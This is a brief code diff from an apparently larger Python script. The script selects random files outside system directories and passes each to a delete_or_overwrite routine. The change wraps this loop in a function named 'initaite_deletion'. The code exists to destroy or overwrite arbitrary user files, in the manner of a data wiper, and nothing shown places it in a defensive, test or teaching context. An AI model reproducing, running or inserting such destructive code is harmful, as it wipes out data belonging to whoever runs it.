@@ -47,6 +47,7 @@ search_paths = [
 excluded_dirs = ["/proc", "/usr", "/snap", "/sys",]
 
 # Get random files and process them
-files_to_process = get_random_files(search_paths, excluded_dirs, num_files=1)
-for file in files_to_process:
-    delete_or_overwrite(file)  # Process each file individually
+def initaite_deletion(): 
+    files_to_process = get_random_files(search_paths, excluded_dirs, num_files=1)
+    for file in files_to_process:
+        delete_or_overwrite(file)  # Process each file individually
